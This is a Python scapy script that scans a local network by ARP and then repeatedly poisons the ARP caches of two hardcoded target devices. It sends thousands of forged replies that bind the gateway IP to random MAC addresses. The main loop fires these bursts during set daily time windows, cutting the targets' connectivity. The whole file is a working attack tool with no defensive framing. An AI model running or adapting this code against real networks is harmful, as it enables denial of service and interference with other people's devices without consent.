#! /usr/bin/env python

from scapy.all import *
import time
import random
import os

def GetSubNet(OurIP):
    Index,SubString = 0,""
    while True:
        num = OurIP.find('.',Index)
        if num != -1 : Index = num + 1
        else : SubString = OurIP[:Index];break
    return SubString

def GetMac(tgtIP,Retry=4):
    cnt = 0
    try:
        while cnt < Retry:
            tgtMac = getmacbyip(tgtIP)
            if tgtMac is None:
                print("Get Mac of IP <%s> failed...Will Retry the <%s> times"%(tgtIP,cnt));cnt += 1
            else:return tgtMac
    except:
        print("Get Mac of %s failed..."%tgtIP)
        return None

def GetBrocastIP(OurIP):return GetSubNet(OurIP) + "255"

def GetForgedIP(OurIP,Num):
    SubString = GetSubNet(OurIP)
    ForgedIP,i = [],0
    while i < Num:
        num = int(random.uniform(0,255));TempIP = SubString + "%d"%num
        if TempIP == OurIP:continue
        else:ForgedIP.append(TempIP);i += 1
    return ForgedIP

def GetForgedMac(OurMac,Num):
    ForgedMac,j = [],0
    while j < Num:
        while True:
            i,TempMac = 0,""
            while i < 6:
                num = random.randrange(0,256,1)
                TempMac = TempMac + "%02X"%num
                if i <= 4:TempMac = TempMac + ":"
                i += 1
            #Almost impossible that a forged MAC is our own.
            if TempMac == OurMac:pass
            else:ForgedMac.append(TempMac);j += 1;break
    return ForgedMac

Table = {}
def ScanfByArpOnce(OurIP = "192.168.0.1",Start = 0,End = 255,TimeOut = 3,ClearAtFirst = 1):
    if ClearAtFirst is 0 : Table.clear()
    SubString = GetSubNet(OurIP)
    ip = []
    for num in range(Start,End+1):ip.append(SubString+str(num))
    ans,unans=srp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(op=1,pdst=ip),timeout=TimeOut)
    def GetArpResult(r):
        Table[r.sprintf("%ARP.hwsrc%")] = r.sprintf("%ARP.psrc%")
        return r.sprintf("%ARP.hwsrc%\t%ARP.psrc%")
    g = lambda(s,r):GetArpResult(r)
    ans.summary(g)

def ScanfByArp(Retry=4,Delay=4):
    for i in range(0,Retry):
        time.sleep(i*Delay)
        #Clear the table at first
        ScanfByArpOnce(Start=100,End=150,TimeOut=Delay,ClearAtFirst=i)

def GetIpByMac(Mac):
    return Table.get(Mac)

MY_ip,MY_mac,BctIP,Bct_mac,GW_ip,GW_mac=None,None,None,None,None,None

def GetOurInf(Face,Debug=True):
    global MY_ip
    global MY_mac
    MY_ip = get_if_addr(Face)
    MY_mac = get_if_hwaddr(Face)
    if MY_ip is None or MY_mac is None:return False
    if Debug is True:print("%s -> %s"%(MY_ip,MY_mac))
    return True
    
def GetLanInf(GWIP="192.168.0.1",Debug=True):
    global BctIP
    global Bct_mac
    global GW_ip
    global GW_mac
    
    BctIP = GetBrocastIP(MY_ip)
    Bct_mac = "ff:ff:ff:ff:ff:ff"
    if Debug is True:print("%s -> %s"%(BctIP,Bct_mac))
    GW_ip = GWIP
    GW_mac = GetMac(GW_ip)
    if GW_mac is None:return
    if Debug is True:print("%s -> %s"%(GW_ip,GW_mac))

def GetAllHostInf(TargtMAC,Debug=True):
    ScanfByArp(2,2)
    if Debug is True:
        for targtmac in  TargtMAC:
            targetip=GetIpByMac(targtmac)
            if targetip is not None:print("%s -> %s"%(targetip,targtmac))
    
def GeneratePacket_1(PackNum,TargtMAC):
    PKT = []
    for targtmac in TargtMAC:
        targtIP = GetIpByMac(targtmac)
        if targtIP is not None:
            Temp_mac = GetForgedMac(MY_mac,PackNum)
            PKT_ = Ether(dst=targtmac)/ARP(op=1,psrc=GW_ip,hwsrc=Temp_mac,pdst=targtIP,hwdst=targtmac)
            PKT.append(PKT_)
    return PKT
def SendPacket(Face,PKT,Counter=1,Interval=1,Debug=True):
    if len(PKT) is 0:
        if Debug is True:print("Send zero packet....");return
    for num in range(0,Counter):
        try:
            sendp(PKT,iface = Face);
            if Debug is True:print("Wair for %s S had sent %s packets"%(Interval,num))
            time.sleep(Interval)
        except:print("!!Send Error!!")
        
def ShouldWeAttack(ScheduleTable,Debug=True):
    CurHour=time.localtime(time.time()).tm_hour
    CurMinu=time.localtime(time.time()).tm_min
    CurCounter=CurHour*60+CurMinu
    for i in range(0,len(ScheduleTable)//4):
        Temp_Start=ScheduleTable[i*4+0]*60+ScheduleTable[i*4+1]
        Temp_End=ScheduleTable[i*4+2]*60+ScheduleTable[i*4+3]
        if (CurCounter>Temp_Start)and(CurCounter<Temp_End):return True
    if Debug is True:
        print(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time())))
    return False

def Attack_MAC(Face,GWIP,MAC,PackNum,Counter,Interval):
    GetOurInf(Face,Debug = True)
    GetLanInf(GWIP="192.168.0.1",Debug=True)
    GetAllHostInf(MAC,Debug=True)
    PKT=GeneratePacket_1(PackNum,MAC)
    SendPacket(Face,PKT,Counter,Interval)
    return 
    
def EnsureWifiConnection(GWIP="192.168.0.1",Interface="eth0",Delay=2):
    if IsWifiWorkWell(GWIP) is False:
        print("Will restart the interface <%s>"%Interface)
        os.system("sudo ifconfig %s down"%Interface)
        time.sleep(Delay)
        os.system("sudo ifconfig %s up"%Interface)
        time.sleep(Delay)
        os.system('sudo /etc/init.d/networking restart')
        time.sleep(Delay)
        print("Network restart finished...")
        return True
    else:return False
    
def IsWifiWorkWell(GWIP = "192.168.0.1"):
    res = GetMac(GWIP)
    if res ==None :return False
    if res == "ff:ff:ff:ff:ff:ff":return False
    if res == "00:00:00:00:00:00":return False
    return True

if __name__ == "__main__":
    #0:00~2:30
    #6:00~8:30
    #17:30~23:59
    ScheduleTable=[0,0,2,30,6,0,8,30,18,00,23,59]
    #ScheduleTable=[0,0,23,59]
    TargetMac = ["04:e6:76:46:a6:f3","78:02:f8:34:4d:b5"]
    #TargetMac = ["78:02:f8:34:4d:b5"]
    while True:
        if ShouldWeAttack(ScheduleTable,True) is False:time.sleep(random.randrange(30,60));continue
        EnsureWifiConnection("192.168.0.1","wlan0",2)
        Attack_MAC("wlan0","192.168.0.1",TargetMac,2,random.randrange(4500,6500),0.05)
